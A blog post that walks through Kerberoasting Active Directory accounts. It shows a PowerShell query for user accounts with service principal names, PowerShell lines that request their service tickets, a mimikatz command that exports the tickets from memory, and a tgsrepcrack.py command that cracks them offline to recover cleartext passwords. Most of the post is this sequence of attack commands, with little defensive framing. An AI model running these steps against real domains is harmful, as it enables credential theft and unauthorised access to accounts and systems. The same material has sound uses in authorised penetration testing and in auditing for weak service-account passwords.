---
layout: post
title: Kerberoasting Active Directory Accounts
date: 2022-07-09 13:32:20 +0300
description: Kerberoasting Active Directory Accounts
img: Password.png
fig-caption: # Add figcaption (optional)
tags: [Productivity, Workflow] # add tag
---
## Identifying User Objects Vulnerable to Kerberoasting
<p>The below PowerShell command identifies user objects that have a Service Principal Name (SPN). Any user object with a SPN is vulnerable to kerberoasting. The below command requires the Active Directory PowerShell module.</P> 

~~~powershell
Get-ADUser -filter {(ServicePrincipalName -like "*") -and (Enabled -eq $true)} -Properties ServicePrincipalName, PasswordLastSet | Select Name, ServicePrincipalName, PasswordLastSet
~~~

<p>After identifying user objects configured with a SPN, the below commands can be entered into PowerShell to retrieve the service ticket for the user object and store it in memory. The service ticket contains the encrypted password for the user object. If the user object is configured with a weak password, it may be possible to crack it and reveal the clear text password.</p>

~~~powershell
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "InsertSPNNameHere"
~~~

<p>After retrieving the service ticket into memory. A tool such as <a href="https://github.com/gentilkiwi/mimikatz" title="mimikatz">mimiktaz</a> can be used to retrive the service ticket from memory. The below mimikatz command retrieves service tickes from memory and saves it as a kirbi file.</p>

~~~cmd
mimikatz # kerberos::list /export
~~~

<p>The kirbi file can now be taken offline and cracked to reveal the clear text password. The <a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" title="tgsrepcrack.py">tgsrepcrack Python script</a> and a wordlist can be used to crack the clear text password. Below is the required syntax:</p>

~~~bash
python3 tgsrepcrack.py dictionaryfile .kirbifile
~~~

<p>The following screenshot shows a service ticket being successfully cracked to reveal the clear text password</p>

![crackedspnexample]({{site.baseurl}}/assets/img/crackspn.png)